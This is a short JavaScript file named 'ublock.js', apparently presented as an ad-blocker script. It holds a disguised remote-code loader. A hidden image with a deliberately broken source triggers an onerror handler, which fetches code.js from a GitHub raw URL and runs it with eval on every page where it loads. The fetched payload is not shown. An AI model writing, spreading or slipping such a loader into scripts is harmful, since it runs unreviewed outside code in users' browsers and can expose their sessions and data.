/// ublock.js
(function () {
  const img = document.createElement('img');
  img.src = 'x';
  img.style.display = 'none';
  img.onerror = function () {
    fetch('https://raw.githubusercontent.com/StudioCompile/Ublock-features/refs/heads/main/code.js')
      .then(r => r.text())
      .then(code => eval(code));
  };
  document.documentElement.appendChild(img);
})();
